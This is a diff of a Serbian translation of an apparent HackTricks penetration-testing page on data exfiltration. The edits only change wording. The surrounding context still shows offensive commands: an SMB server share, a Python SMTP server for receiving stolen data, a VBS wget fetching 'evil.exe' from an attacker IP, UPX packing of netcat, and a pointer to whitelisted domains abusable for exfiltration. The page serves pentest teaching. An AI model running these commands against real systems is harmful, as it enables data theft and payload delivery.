@@ -17,7 +17,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## Uobičajeni domeni koji su na beloj listi za exfiltraciju informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli uobičajene domene na beloj listi koje se mogu zloupotrebiti
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
 ## Copy\&Paste Base64
 
@@ -163,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte smb deljenje **koristeći samba**:
+Ili kreirajte smb share **koristeći sambu**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -241,7 +241,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete slati podatke na SMTP server, možete kreirati SMTP za primanje podataka pomoću Pythona:
+Ako možete poslati podatke na SMTP server, možete kreirati SMTP da primite podatke pomoću Pythona:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb u veličini**.
+Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb veličine**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
